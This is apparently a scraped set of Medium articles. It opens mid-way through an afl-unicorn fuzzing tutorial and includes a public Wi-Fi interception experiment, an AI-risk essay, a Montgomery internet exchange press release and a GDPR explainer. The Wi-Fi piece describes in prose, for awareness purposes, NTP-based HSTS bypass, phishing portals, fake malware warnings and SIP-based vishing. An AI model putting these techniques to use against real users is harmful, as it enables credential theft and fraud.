In line 45 the number of bytes is retrieved from the stack. Line 46 calls the internal, Unicorn-based implementation. Line 47 puts the return value (the address of the buffer that was allocated) into EAX, and lines 48 and 49 manually perform a ‘return’ by setting EIP to the return address and then popping the return address off of the stack. All of this is in accordance with typical x86 calling conventions. When adapting this approach to your own binary, make sure that you follow the calling conventions for your given operating system and architecture!
Another major benefit of handling memory allocation ourselves is that we can implement our own rudimentary guard pages. Basically, all allocated buffers are surrounded by ‘guard pages’ which have no read or write permissions. Any access outside of the bounds of the returned buffer (AKA a heap overflow or underflow) will crash immediately with a memory access violation.
Note that the UnicornSimpleHeap class in the unicorn_loader.py module provides free(), calloc(), and realloc() functionality as well, but for simplicity I’ve chosen to only hook malloc() in this example. For emulating larger, longer-running, and more complex code you will probably want or need to hook all of the heap-related functions.
Skipping unnecessary, hard to emulate functions: There are many other things that will obviously cause issues. Printf(), for instance, will surely call into the kernel in order to send the text to be printed to the graphics device for rendering. You’ll want to analyze the code that you’re trying to emulate and work hard to identify anything that you think is likely to break emulation. In this example case, I’ve determined that free(), printf(), and cgc_transmit() will cause emulation to fail for various reasons, and also that I can also skip them without any major consequences to fuzzing results. All of these functions are skipped by forcing an immediate return. This is accomplished the same way as the final part of the malloc() hook described above: Manually set EIP to the return address stored on the stack, then pop the return address off the stack by adding 4 to ESP. Remember that this exact process is specific to x86, so adjust as necessary for your target architecture.
Bypassing the checksum validation: Each received packet is accompanied by a 16-bit CRC that must be validated before the packet is verified (refer to lines 27–31 from the source snippet earlier in the article). This alone presents a major challenge for traditional fuzzing, as any attempt to blindly modify packets will result in a failed CRC check and almost no code coverage. This type of problem is well known, but traditionally it requires patching of the target binary or development to correctly generate a valid checksum for each input.
Afl-unicorn makes bypassing this fairly trivial. For this example the checksum validation was very easy to identify in IDA:
We simply hook the call to cgc_simple_checksum16(), and anytime execution gets there EIP is manually set to the ‘CRC check passes’ path:
This doesn’t prevent us from having to figure out how to calculate the CRC later in order to develop a full working exploit, but it lets us push that work down the line and instead focus on finding vulnerabilities first.
Emulating one instruction before loading mutated input: Here’s the weirdest part, and it’s really just an artifact of how I’ve instrumented AFL into Unicorn because I haven’t come up with a solution to the real internal problem yet: In order to make sure that AFL’s forkserver starts up at the right time, you MUST emulate at least 1 instruction before you load the mutated input from disk. If you don’t, then every fork that AFL creates will execute with the same input. In the example script this is done between lines 82 and 87:
So basically you just need this block of code in your test harness somewhere before you load the mutated input. There is one nuance, though: You need to ask yourself if re-executing the first instruction has any negative consequences. In this example the first instruction executed is a harmless ‘mov [esp],ecx’, so re-executing it doesn’t have any negative consequences. If you don’t want to or can’t afford to re-execute the first instruction, simply adjust the starting address appropriately the second time you start emulation (uc.emu_start()).
With the Unicorn harness complete the only thing left to do is run it under afl-unicorn and hope that it finds some crashes. For a detailed breakdown of how to run afl-unicorn make sure you read my previous blog post, but for this specific instance we just run the typical afl-unicorn command line:
Sure enough, it found the vulnerability in the cgc_packet_receive() function described in the challenge’s README:
Upon reception of a packet that exceeds the maximum packet size of 64-bytes improper length checking is done for the memcpy to the newly allocated packet structure. This allows a memory overwrite to occur on the heap. This data structure has a function pointer to the packet handler that can be overwritten and once the service executes this function pointer there is an opportunity for control flow execution by overwriting this function pointer.
It’s obvious from dumping the crashing input file that the packet is too large (>48 bytes) for the packetData buffer allocated in the tSinglePacketData structure:
We can then verify this by running the Unicorn script with the crashing input:
The next step would be to figure out how to send this crashing input into the actual (non-emulated) application and prove that it is a true, working crash and that it does not stem from an emulation error.
Some common problems that I’ve encountered include:
If things look good (new paths are being discovered fairly regularly), then the everything else follows typical AFL use patterns. Make sure your sample inputs gets good coverage of the target code and fuzz to your heart’s content.
In this post I’ve demonstrated an example of how we’ve been using afl-unicorn to fuzz hard-to-reach interfaces of real-world applications. We’ve found this methodology to be very effective on Windows, Linux, Android, and iOS applications, and I assume that it would be easily portable to embedded systems.
The outstanding tasks are mainly to continue using the scripts that make this methodology usable and expand them to additional operating systems and architectures. For example, emulating Windows applications introduces a long list of issues as references to the PEB and TIB cause false crashes because of references to the GS segment register. Operating-system specific utilities could be created (in a similar manner as the UnicornSimpleHeap class that’s already in the unicorn_loader.py module) to handle these known cases with minimal instrumentation. This would be very similar to the route taken by the usercorn project. In addition, the ripr project is extremely interesting and I believe that there is a good possibility that their code-generation methods could be adapted or extended to generate a template test harness that would be very easy to make fuzzable.
In a future blog post I plan to demonstrate using afl-unicorn against a flat run-time memory image retrieved from an embedded system. That use case was the original inspiration for creating afl-unicorn, and I still believe it is the ideal environment as it avoids most of the problems introduced when trying to emulate a userland application running in a more sophisticated, multi-threaded OS.
I developed afl-unicorn and the methodology described here as an internal research project in collaboration with Parker Wiksell at Battelle in Columbus, OH. Battelle is an awesome place to work, and afl-unicorn is just one of many examples of novel cyber security research being done there. For more Battelle-sponsored projects, check out Chris Domas and John Toterhi (AKA cetfor)’s previous work. For information about careers at Battelle, check out their careers page.
Of course none of this would be possible without AFL and Unicorn Engine. Lots of additional inspiration came from Alex Hude‘s awesome uEmu plugin for IDA, and many of the general concepts were borrowed from the NCC Group’s AFLTriforce project. A bunch of additional inspiration was pulled from the usercorn project, as it proved that Unicorn can be successfully made to run user-space applications.
Written by
","['About', 'Help', 'Go Home', 'Hacking', 'Fuzzing', 'Reverse Engineering', 'Vulnerability Research', 'Cybersecurity']"
"A hacker intercepted your Wi-Fi traffic and stole your contacts, passwords, and financial data. Here’s how.",https://medium.com/hackernoon/a-hacker-intercepted-your-wifi-traffic-stole-your-contacts-passwords-financial-data-heres-how-4fc0df9ff152?source=tag_archive---------0-----------------------,"As the holiday season was in full swing, a hacker sporting a hoodie, sitting in a car with antennae on the dashboard and a computer on his lap, sat in a parking lot outside a popular cafe chain. Passersby, busied and high on holiday cheer, buzzed in and out and sometimes even stayed for a while.
As he watched Wi-Fi traffic for several hours, nobody called the police or even seemed to notice. People accessed websites like Netflix and Google insecurely over HTTP, revealed all of their browsing activities, made phone calls revealing phone numbers, and sent plenty of unencrypted traffic available for him to intercept or modify at will to carry out phishing or vishing attacks. This is how I think such a story could be carried out.
I didn’t actually hack anyone, but I did build a tool to show how hackable people are when they use the Internet.
It’s like a credit score, but for your security vulnerabilities.
I am a security researcher and cypherpunk with a fascination for the human element and its role in everyday people’s privacy and security.
I have conducted (only a few years ago) social engineering experiments against, e.g., my own phone providers, having friends of mine trick them into letting them access my accounts and information in dangerous ways (resulting in those companies inadvertently violating federal privacy and consumer protection regulations).
In a past life, I had a lot of fun playing with payphones. I am also a big proponent of encrypting everything on the Internet, always.
During my day job, I work on making the Internet safer and more performant at Magic — which is building a decentralized Internet backbone for the future.
Over the holidays, I set up an experiment harvesting public Wi-Fi traffic. Since everything on the web should be encrypted nowadays (and many people incorrectly think that all traffic is encrypted), one might expect that there isn’t much to be seen.
Unfortunately, that’s not the case. While the state of insecurity has improved since Firesheep’s prime, an attacker can still phish you and play games with your packets when you use a public network. Sorry to be the bearer of bad news…
The scores are pretty bad: Tons of online traffic remains entirely unencrypted today, leaving the public susceptible to attack.
One of the convenient things about the holidays is that plenty of potential victims congregate at shopping centers. This makes it relatively easy for an attacker to target a large number of personal devices just by “setting up shop” near locations where people are accustomed to finding unencrypted Wi-Fi.
These shoppers are also likely loaded with money to spend and are doing so at such a high frequency and at so many locations that they’ve probably already nullified some of their bank’s (and their own) ability to detect fraud with any timeliness whatsoever, making them perfect targets for theft as well.
Whats the recipe for a public Wi-Fi network?
1. Use absolutely no encryption at all, or2. Use a pre-shared key and tell everyone (no different than #1)
Public Wi-Fi is intentionally insecure and susceptible to several modes of attack
There are a variety of attack vectors for sniffing traffic on public networks. Here are a few surprisingly low-effort and low-cost methods:
Does the law effectively protect people on Wi-Fi?
Short answer: Not really.
While certain caselaw has found that receiving unencrypted Wi-Fi communications under certain circumstances might not be illegal* under Federal law in the U.S., there exist some contradictory opinions on the matter, and there also exist a whole host of states’ laws that protect privacy.
That being said, the three modes I mentioned (above) are so easy that a lamer or script kiddie can use them. So, while The Fuzz should scare you away from hacking your friends, you should not base your own cybersecurity defenses on the assumption that (laws written on) paper will somehow shield you from cyber bullets.
* Disclaimer: The “jury” is still out (so to speak, since Federal courts are not in agreement) on the legality/illegality of intercepting unencrypted Wi-Fi communications under Federal law. I’m not a lawyer, and none of what appears in this article is legal advice; but, as an example, Google settled a lawsuit for a mere $7MM involving Google Street View intercepting and recording unencrypted traffic sent on other people’s networks, which contained passwords and all sorts of juicy information. Google can probably afford better lawyers than you, so consider yourself forewarned to not do naughty things! I refuse to be held responsible for the consequences of your own actions.
Pineapples are a symbol of hospitality, so I built a Wi-Fi pineapple to make new friends.
As someone who cares about obeying the law and protecting people’s privacy, I designed a white-hat experiment to uphold principles of honesty, consent, anonymity, and data privacy.
Unlike Google Street View, I chose not to surreptitiously record (in memory or to disk) application payloads, any personally identifiable information, or even any metadata about which hosts connected to which servers.
I set up a homemade captive portal analogous to what’s referred to as a Wi-Fi pineapple, but with the key difference that it did not impersonate the names of any nearby or common wireless networks (because I did not want users to have any misconceptions about who operated the network).
The SSID “Free Guest WiFi” seemed generic enough, and it greeted users with a nice captive portal splash page containing a non-verbose agreement that obtained from the user consent to having the user’s information and communications monitored.
Overall, this was a pretty friendly way to conduct the experiment. A real attacker would be far more aggressive.
To further protect users’ privacy, I wrote a small tool to gather statistics about the protocols and ports that applications were using over the network.
Three lines of code is all it really takes:
My tool, as designed, does not record any IP addresses, MAC addresses, host names, or application data, and cannot be configured in a way to do any of that. It serves only one purpose: summarizing types of packets and ports being used in the least intrusive way possible.
In fact, my tool is less intrusive than the deep packet inspection and intelligence provided by enterprise access points and routers (e.g. Ubiquiti Networks products), which ensured that I would be less creepy than a sysadmin and significantly less creepy than an ISP. To further help protect privacy, I made sure any captive portal logs were written into a tmpfs volume just in case there could be any usage log leakage.
Again, I think this is pretty darn nice of me.
A black-hat hacker could simply use Wireshark and see all of the application data and which websites were being visited.
Here’s how many people connected over the course of one afternoon:
49 devices connected
100% accepted the ToS in the captive portal and sent data
0 devices used VPNs
The scientists among you will notice my experiment introduces selection bias. The statistics gathered only included persons that explicitly scanned for open Wi-Fi networks, chose my network, and accepted the terms on the captive portal splash page. Such people selecting public networks might be more likely to engage in risky internet behaviors. But, the fact that human interaction was required highlights just how easy these types of attacks are.
I actively made choices that made it difficult to collect users data and nearly 50 people still connected, even though other open networks existed in the vicinity.
Furthermore, due the fact that using my network required human interaction in the first place, it necessarily excludes any Internet of Things (IoT) devices from being included in the statistics and includes only devices with which humans are directly interacting (e.g. mobile phones and laptops).
More bad news here: >42% of all traffic through my pineapple was unencrypted HTTP traffic.
My tool ignored non-IP traffic from its statistics. After gathering 489,330 IP packets, it reported that:
The raw transport, port, counts, and percentages were as follows:
In conjunction with DNS and NTP being insecure, to have 42% of traffic potentially be unencrypted HTTP traffic sent via Port 80 is deeply concerning. What about those HTTP Strict Transport Security (HSTS) policies that web browsers should be enforcing? Is the traffic non-web traffic or some sort of other false positive?
I later set up a second experiment in my own lab to examine the behavior of a few popular websites myself. I discuss these findings further in Part 2 of this series (where I also explain why we are where we are today, and explain what some popular websites are doing incorrectly).
But, I’ll summarize the findings here:
Darn!
Before you go through the trouble of trying to find data to refute this analysis, LMGTFY: I tried really hard to prove myself wrong, but then I found Google’s HTTPS encryption on the web transparency report, which uses anonymous usage reporting among Chrome users as well as Google’s own internal data as sources to determine the state of HTTPS usage on the web.
According to Google’s own report (as of December 29, 2018):
That’s not insanely far off from the statistics recorded by my tool, especially considering the selection bias and also my unscientific observation that more people were drinking coffee and using mobile devices (just look at that 82.6% number, again!) than were sitting at laptops.
I’m not saying we need to fear the FUD… but, actually, I am saying that we need to fear the FUD.
I’m also saying that you should fear hackers wearing hoodies, with antennae all over their vehicles, that are looking at you through binoculars in broad daylight, but I digress.
I did not hack anybody or compromise anybody’s privacy, and I did consult with legal counsel before publishing this. But, here are some of the ways that people using public Wi-Fi can be compromised, today, by inexpensive hardware and/or free tools (e.g. wireless adapter, Wireshark, Bettercap, etc.).
First, to successfully carry out a phishing attack, an attacker could target some of the popular sites that are accessible over HTTP and not implementing HSTS properly, maybe also leveraging DNS requests since all are insecure (in a sense, captive portals used to work by carrying out DNS-forged MITM attacks every time they wanted to display their splash pages, and this is easily accomplished with DNS today since DNS has never been secured properly since).
Our hypothetical attacker could, ideally, create a sense of urgency to get users to make more mistakes by hurrying (i.e. overlooking the long and slightly modified URL in the address bar). For example, a captive portal that prompts a user for their email address and provides a very short amount of time to check email for a verification link before they get kicked offline could be the perfect companion to a phishing login page for said email provider.
Best yet, once grabbing the user’s credentials and confirming that they are correct, booting them off the network with a fake error message might slow them down from noticing the compromise or from resetting their email password. >:~>
Serving up the hypothetical attacker’s own phishing pages and securing them with Let’s Encrypt certificates should be easy enough. At least, then, they should look “secure” just long enough to fool a frantic Internet addict into trading their digital identity for a few more minutes of Snapchat. If someone wanted to target credentials for a higher-profile website — perhaps one that actually implements HSTS properly but, with no surprise, just like a number of popular websites it isn’t in the preloading list — the attacker could just wait to target potential victims until after their computer sent an NTP request.
By playing with time travel and alternate universes (forging an NTP response with a time set in the future), all HSTS policies cached by the user’s browser whose cache entries expired before the new “present” time could be invalidated. Then, the attacker could just carry out a downgrade attack, 301 Redirect via HTTP to a phishing page, and the rest is gravy.
Our hypothetical attacker could trick people into installing some backdoor or botnet software. From then on, the attacker could basically pwn their devices, information, and network of contacts whenever convenient, and identity theft or theft of money would be easy. For this, the attacker could pop up some “warnings” about viruses or spyware on the computer, and kindly suggest that users install an actual virus to “fix” it.
This would require the user to actually allow the attacker’s software to be installed. Alternatively, our hypothetical attacker could just mine cryptocurrency in users’ web browsers, which wouldn’t require tricking users into giving their consent for software to be installed.
Additionally, the traffic that my tool saw sent over Port 5090 is interesting, in that it is a port used by common business VoIP mobile apps to send phone calls over the SIP protocol. Some cellular providers similarly offload voice traffic in this way. I was pleasantly surprised to see this in my statistics! Even if SIP payloads are encrypted, their headers are not, and often contain CID and DID (telephone numbers) in the clear.
This could be particularly useful to our hypothetical hacker for carrying a vishing attack on victims or their contacts, since CIDs are easily spoofed to make an attacker caller look familiar. If our hypothetical hacker wanted to hack you or your life by phone, he or she could gather these phone numbers and have a little fun with them later. >:~> >:~>
I’m not trying to over-hype the problems with public Wi-Fi, but I do want to keep these issues at the forefront of people’s minds.
We’ve made progress improving the Internet’s basic security, but it’s not anywhere close to enough.
There are still gaping problems that we (technologists) have failed to fix for the rest of humanity for way too long. On public Wi-Fi networks, even today, an attacker can:
I’m glad you asked.
There are some commonsense things you can do to make yourself a less-easy target. By default, you should at least use a VPN and the HTTPS Everywhere browser plugin. If you are not, you probably should reconsider your security posture entirely.
We are actively working on solving these problems at Magic, where we are implementing VPN-like functionality and a capabilities-based security paradigm by default.
To learn more and join the conversation on how to build a safer, more performant Internet, check out magic.co or https://github.com/magic-network
In Part 2 of this series, I look into the question, “Why are we here?” and what popular websites and protocols are doing wrong to create such a mess. Then, in the upcoming Part 3 of this series, I will discuss the exhaustive list of things one needs to do in order to be safe online, in light of what I discussed in Parts 1 and 2.
Written by
","['About', 'Help', 'Go Home', 'Security', 'Cybersecurity', 'Wifi Hacker']"
AI: Scary for the Right Reasons - Vinod Khosla - Medium,https://medium.com/@vkhosla/ai-scary-for-the-right-reasons-185bee8c6daa?source=tag_archive---------6-----------------------,"Artificial intelligence, AI, has grabbed headlines, hype, and even consternation at the beast we are unleashing. Every powerful technology can be used for good and bad, be it nuclear or biotechnology, and the same is true for AI. While much of the public discourse from the likes of Elon Musk and Stephen Hawking reflects on sci-fi like dystopian visions of overlord AI’s gone wrong (a scenario certainly worth discussing), there is a much more immediate threat when it comes to AI. Long before AI goes uncontrollable or takes over jobs, there lurks a much larger danger: AI in the hands of governments and/or bad actors used to push self-interested agendas against the greater good.
For background, as a technology optimist and unapologetic supporter of further development, in 2014 I wrote about the massive dislocation in society AI may cause, and while our economic metrics like GDP, growth, and productivity may look awesome as a result, it may worsen the less visible, but in my opinion, far more critical metrics around income disparity and social mobility. More importantly, I argued why this time might be different than the usual economists’ refrain that productivity tools always increase employment. With AI, the vast majority of current jobs may be dislocated regardless of skill or education level. In the previous industrial revolution, we saw this in agriculture between 1900–2000, when it went from a majority of US employment to less than 2%, and in industrial jobs, which today are under 20% of US employment. This time, the displacement may not happen to just lower skill jobs — truck drivers, farm workers and restaurant food preparers may be less at risk than radiologists and oncologists. If skilled jobs like doctors and mechanical engineers are displaced, education may not be a solution for employment growth (it is good for many other reasons) as is often proposed by simplistic economists who extrapolate the past without causal understanding of reasons why. In this revolution, machines will be able to duplicate the tasks they previously could not: those that require intellectual reasoning and fine grained motor skills. Because of this, it is possible that emotional labor will remain the last bastion of skills that machines cannot replicate at a human level and is one of the reasons I have argued that medical schools should transition to emphasizing and teaching interpersonal and emotional skills instead of Hippocratic reasoning.
We worry about nuclear war as we should, but we have an economic war going on between nations that is more threatening. The pundits like Goldman Sachs advocate internationalism because it serves their interests well and is the right thing if played fairly by all. And though the wrong answer, in my view, is economic nationalism, the right answer goes far beyond just a level playing field. While Trump-mania may somewhat correctly stem from feelings of unlevel playing fields in China, the problem is likely to get exponentially worse when AI is a factor in these economic wars. This problem of economics wars will likely get exponentially amplified by AI. The capability to wage this economic war is very unequal among nation states like China, USA, Brazil, Rwanda or Jordan based on who has the capital and the drive to invest in this technology. As it’s mildest implications, left to its own devices, AI technology will further concentrate global wealth to a few nations and “cause” the need for very different international approaches to development, wealth and disparity.
I wrote about the need to address this issue of disparity, especially since this transformation will result in enormous profits for the companies that develop AI, and labor will be devalued relative to capital. Fortunately, with this great abundance, we will have the means to address disparity and other social issues. Unfortunately, we will not be able to address every social issue, like human motivation, that will surely result. Capitalism is by permission of democracy, and democracy should have the tools to correct for disparity. Watch out Tea Party, you haven’t seen the developing hurricane heading your way. I suspect this AI driven income disparity effect has more than a decade or more to become material, giving us time to prepare for it. So while this necessary dialogue has begun and led to the ideation of solutions such as robotic taxes and universal basic income, which may become valuable tools, disparity is far from the worst problems AI might cause and we need to discuss these more immediate threats.
In the last year alone, the world has seen some of the underpinnings of modern society shaken by the interference of bad actors using technology. We’ve directly seen the integrity of our political system threatened by Russian interference and our global financial system threatened by incidents like the Equifax hack and the Bangladesh Bank heist (where criminals stole $100m). AI will dramatically escalate these incidents of cyberwarfare as rogue nations and criminal organizations use it to press their agendas, especially when it is outside our ability to assess or verify. This transition will resemble what we see when wind becomes a hurricane or a wave becomes a tsunami in terms of destructive power. Imagine an AI agent trained on something like OpenAI’s Universe platform, learning to navigate thousands of online web environments, and being tuned to press an agenda. This could unleash a locust of intelligent bot trolls onto the web in a way that could destroy the very notion of public opinion. Alternatively, imagine a bot army of phone calls from the next evolution of Lyrebird.ai with unique voices harassing the phone lines of congressmen and senators with requests for harmful policy changes. This danger, unlike the idea of robots taking over, has a strong chance of becoming a reality in the next decade.
This technology is already on the radar of the authoritarian countries of today. For example, Putin has talked about how AI leaders will rule the world. Additionally, China, as a nation, has focused on very pointedly acquiring this powerful new AI technology. The accumulation of expertise beyond normal business competition and their very large funding directed here is a major concern. This is potentially equivalent to or worse than the US being the only nation with nuclear capabilities when the Hiroshima attack was conducted. There was very little for our Japanese opponents to respond with. It is hard to say if this economic war weapon will be as binary as the nuclear bomb was, but it will be large and concentrated in a few hands and subject to little verifiability. Surreptitious efforts, given its great amplification potential, could create large power inequality.
Matters get worse if one realizes that major actors in AI development in the West, like Google, Facebook, and universities, have adopted a generally open policy publishing their technology approaches and results in scientific journals in order to share this technology more broadly. If individual state actors don’t do that, and I doubt they will, we will have a one way flow of technology from the US. AI development in certain parts of the world will additionally have huge advantages because of policies against/for data. As Andrew Ng (a Stanford professor hired by massive Chinese company, Baidu, to lead it’s AI efforts until he left to incubate his own ideas) has said, “Data is the rocket fuel for the AI engine”. So while AI progress has been frenetic recently, it will be much faster when data privacy and occasional accidents are less important in the interest of “national security.” This disregard for data privacy and one way transfer of technology will lend nationalistic countries like China and Russia a huge advantage in this generation’s space race.
AI will be much more than an economic, business, or competition issue that it is talked about today. We will need to rethink capitalism as a tool for economic efficiency because efficiency will matter less, or at the very least, disparity will matter more, but that consideration may be many decades away. The biggest concern in the next decade is that AI will dramatically worsen today’s cyber security issues and be less verifiable than nuclear technology. Nationalistic nations like China and thuggish dictators like Putin will have massively amplified clandestine power. I don’t believe we, as a society, would be willing to give up the safeguards in our society like open progress and privacy to “keep up” with other nations. I have some thoughts as to what we can do here, but this is a complex problem without obvious solutions. Maybe we limit funding of non-NATO investors in US AI companies? Maybe having the US government or NATO invest in their own AI technologies for national security? An AI white hats force? Increased efforts in Black Swan developments like quantum computing? Less risk aversion, more patience, and less backlash from society and government to the risks, biases and shortcomings of new AI technology as it grows up? Regardless of what we do, what’s clear is we need much more dialog, debate, and increased countermeasure funding; instead of generating hysteria about some far off dystopian possibility mired in uncertainties and what ifs, we need to focus on the immediate wave of danger before it hits. Not taking risks here might inadvertently be the largest risk we take.
Written by
","['Artificial Intelligence', 'Government', 'Economics', 'Technology', 'Cybersecurity']"
Alabama’s first Internet Exchange unveiled in Montgomery — one of only four in the Southeast,https://medium.com/@CityofMGM/alabama-s-first-internet-exchange-unveiled-in-montgomery-one-of-only-four-in-the-southeast-e2c8b383e7bf?source=tag_archive---------4-----------------------,"Montgomery, Ala., may soon become known as the global center for cyber security now that the City of Montgomery, Montgomery County, the State of Alabama and Maxwell/Gunter AFB and the new Cyber College of the Air Force have aligned to form the Montgomery Cyber Connection
MONTGOMERY — Montgomery, Ala., a city historically inclined to rapid change and revolution — from Rosa Parks to the Wright Brothers first civilian flight school, today released news that propels it to the forefront of global cyber security.
“In 50 years from now when people write about the fact that America reinvented the way it could live with freedom, independence, civil liberties and privacy in an information age and they write about the River Region, Montgomery and Alabama being the leader of that effort, they will find that in this moment the magic ingredients for innovation existed,” Air University Commander Lt. Gen. Steven Kwast said.
Lt. Gen. Kwast was a catalyst for the development of the Department of Defense’s Cyber College at Maxwell Air Force Base. The Air Force Cyber College, which launches in September, will serve as the tip of the sword for the U.S. Department of Defense by creating an environment promoting collaboration between the best and brightest minds in cyberspace and cyber security strategy. It will play a critical role in combatting international and regional threats to cyber security, while collaborating with countries and organizations across the globe to create a safer, more secure Internet.
“Alongside the economic impact, there’s no question that cyber-attacks are on the rise. The cyber war is here, and I am so proud that Montgomery and the River Region, Maxwell and Gunter, are playing a leading role in this fight,” U.S. Rep. Martha Roby, former Montgomery city councilor and congresswoman for Alabama’s 2nd District, said.
U.S. Rep. Terri Sewell, who represents the state’s 7th District and serves on the U.S. House Intelligence Committee, concurred, saying, “There is no bigger threat to our national security than cyber. It is a true testament to the power of collaboration with businesses, government, military and commerce coming together, and I hope that our Internet Service Providers will take full advantage of this resource.”
Uniquely positioned to become a leader in cyber technology thanks to a state-of-the-art datacenter and Maxwell Air Force Base and Gunter Annex, home to Air University and the “IT Nerve Center” of the Air Force, Montgomery’s local government officials and business leaders capitalized on this opportunity. The City of Montgomery, the Montgomery County Commission and the Montgomery Area Chamber of Commerce joined business and military representatives to announce the Montgomery Cyber Connection, an initiative that will dramatically boost internet speeds for partnering Internet Service Providers, improve connectivity among Alabama’s research universities and colleges and expand data capacity.
Located in the Retirement Systems of Alabama’s Dexter Avenue Datacenter, the Montgomery Internet Exchange (MIX) is the driving force for the Montgomery Cyber Connection and makes Montgomery one of only four sites in the Southeast with an Internet Exchange. The MIX will speed content delivery to those in the River Region and beyond by storing it closer to home, rather than pulling it from exchanges located in other parts of the country. Additionally, the MIX will benefit from a partnership with Akamai Technologies. Akamai, a global leader in content delivery network services, will store servers at the RSA Datacenter. Akamai officials chose to locate in Montgomery because of the global significance of the new Cyber College at Air University and because of local public and private partnerships in support of the military.
“Just like first in flight or first in transportation, we are the first to get an Internet exchange in Alabama, and we cannot overstate the significance of the Montgomery Cyber Connection will play in expanding industry and putting Montgomery on the map, while providing the support needed for the Air Force Cyber College to keep us safe, thanks to the foresight and expertise of our military and business leaders,” Montgomery Mayor Todd Strange said.
The Montgomery Cyber Connection will link Alabama’s universities in research collaboration, support the new Air University Cyber College mission to strengthen national defense, and stimulate business development and tech startups. In addition to the tremendous statewide impact for economic development and innovation, The Montgomery Cyber Connection will boost the Montgomery metro economy and improve quality of life for area residents. The Montgomery Cyber Connection opens up a new vertical industry target and job growth potential for the River Region. According to key partners in the effort, the MGM Cyber Connection can have the economic impact of landing a new Hyundai, which creates more than $4.8 billion in statewide impact annually.
“This journey started years ago at the county commission,” Montgomery County Commission Chairman Elton Dean said. “By [Mayor Strange and I] being from corporate America, we expected a lot out of technology, and we are finally realizing the results from that quest to make Montgomery one of the premier cities in the tech field.”
The Montgomery Cyber Connection was created as a result of partnerships among government, military, business and university leaders. More information is available at www.mix-al.net.
###
###
Written by
","['Cybersecurity', 'Innovation']"
All you need to know about GDPR Controllers and Processors,https://medium.com/@sagarag/all-you-need-to-know-about-gdpr-controllers-and-processors-248200ef4126?source=tag_archive---------7-----------------------,"Understanding what GDPR meant as Controller, Processors and their responsibilities.
In the introductory post of this series I have briefly discussed about the GDPR definitions of Controller and Processor, let’s start recalling these definitions.
There are number of similarities between Controllers and Processors, both of these entities can be a natural or legal person, public authority, agency or other body which carried out processing of personal data belong to an individual. A given data processing organization can be either Controller or Processor based on their answers for the following two questions.
If the answer is ‘Yes’ then the organization is a Controller, if the answer is ‘No’ then the organization is a Processor.
Let’s take few examples to explain this concept properly, assume a biscuit manufacturing company delegated a market research company to conduct a research and provide recommendation on what they should target in their new product line in order to reach 10% market growth. This is a very clear goal provided by the biscuit manufacturing company and there is no any other data or conditions provided by the biscuit manufacturing company as well. The marketing research company has the freedom to decide target individuals for the research, what kind of personal data are collecting, what kind of personal data are storing, storage mechanism, approaches of processing data etc. In this example ‘the purpose of the data processing and means of data processing’ is decided by the marketing research company, this means marketing research company is a Controller under the GDPR regulations.
Another example, a payroll management company, they process personal data provided by some other company under their instructions. Usually payroll handling companies don’t determine what the purpose and how to process those payments and related personal data, this means that the particular payroll handling company is a Processor under the GDPR regulations.
Before we conclude this section here is the exact GDPR definitions for Controller and Processor.
‘controller’ means the natural or legal person, public authority, agency or other body which, alone or jointly with others, determines the purposes and means of the processing of personal data; where the purposes and means of such processing are determined by Union or Member State law, the controller or the specific criteria for its nomination may be provided for by Union or Member State law;
The processor is the entity (that can be natural or legal person, public authority, agency or other body ) which processes personal data on behalf of the controller under the controller’s instructions.
Controllers can be further categorized based on factors such as whether they operate as a single legal entity or not, based on their establishment etc.
When more than one controller involving in to decide the purpose and means of processing , those controllers are known as “Join Controllers”, according to the GDPR Join controllers should fulfill following set of requirements.
In addition to general regulations, controllers established outside the EU must appoint a representative and must fulfill following criteria as well.
However public authorities, criminal convictions and organizational processing small amount of personal data (not special categories) in occasional basis are excluded from above requirements.
According to the GDPR controllers should ensure to implement appropriate technical and organizational process to be in compliance with the GDPR, additionally controllers should able to demonstrate those technical and organizational process are accordance with GDPR. These changes may include …
The controller also subject to following two principles
— Data protection by design According to this principle, at the time of determining the purpose of data processing (planning time) and at the time of actual data processing itself (execution time) controllers should implement appropriate technical and organizational measures, few of the most important measures are given below.
— Data protection by default According to this principle, controllers should only processes personal data required for current purpose of the processing, this also implies collection of only required data and store them and store them only for required duration.
The controllers should only use processors who can provide guarantee and demonstrate their in compliance with the GDPR, the GDPR code-of-conduct and certification elements are helpful to make such decisions. Also controllers should ensure processors process data based on the exact instruction provide by the controller.
The controller should maintain record of data processing including following information.
Conducting a data protection impact assessment (DPIA) depending to the nature of the data processing is also a responsibility of the controller, we will discuss impact assessment in a separate section.
The processor should maintain record of data processing including following information.
A data breach is a security incident in which sensitive, protected or confidential data is copied, transmitted, viewed, stolen or used by an individual unauthorized to do so. A data processing organization (controller or processor ) should take every possible measures to eliminate risk of a data breaches but in reality nobody can practically guarantee on 100% security on data or a system, considering this practical risk the GDPR provides comprehensive set of regulations to deal with a data breach incidents which includes
It’s mandatory to establish efficient procedures by controllers/ processors for above notifications.
During a data breach following procedure should be followed to communicate with the supervisory bodies.
— Nature of the the data breach.
— Categories of the data breach.
— Approximate number of individual affected.
— Approximate number of data record affected.
— Consequences of the data breach.
— Proposed measures to mitigate the data breach.
During a data breach following procedure should be followed to communicate to individuals.
The GDPR recommends controllers to carry out a data protection impact assessment (DPIA) depending on the nature of data processing specially when moving to use new technologies. This impact assessment need to be conducted prior to any data processing take place and if the DPO present controllers can seek for advice.
Following are the cases that the GDPR mandate to conduct impact assessments.
An impact assessment should focus on following factors.
In case result of an impact assessment indicate a high risk, the controller can consult supervisory authorities for advices, the GDPR have clear guideline what need to be communicated with a supervisory authorities with applicable timeline details.
The GDPR introduce a special role called Data Protection Officer (DPO) to provide necessary advices to processing organizations and act as the point of contact for outside works such as individuals and supervisory authorities.
Both controllers and processors can appoint a DPO considering his/her professional qualifications, expert knowledge and ability to perform the assigned task, also one DPO can server for a group of related organizations. A DPO can be a staff member of the organization or can be a contract based individual as well, additionally DPO can perform any other tasks within the organization as far as those activities are not cause any conflict of interest issues.
As per the GDPR compliance, a processing organization should assist to the DPO to carry out his activities and should ensure that the DPO is engaged in any matter related to data protection, additionally the DPO should report to the highest level of the processing organization.
Individuals should contact the DPO to solve any issues related to their personal data and the DPO is bound to keep confidentiality in carrying out his/her duties.
According to the GDPR appointment of the DPO is required in following cases.
GDPR text itself does not provide quantitative interpretation about the phrase “ large amount of data “ but according to Gartner ..
processing more than 5000 individuals data within 12 months then such organizations are inclusive under large amount of data “ phrase. (http://www.gartner.com/smarterwithgartner/top-five-priorities-to-prepare-for-eu-gdpr/)
GDPR also list out following basic responsibilities for the DPO.
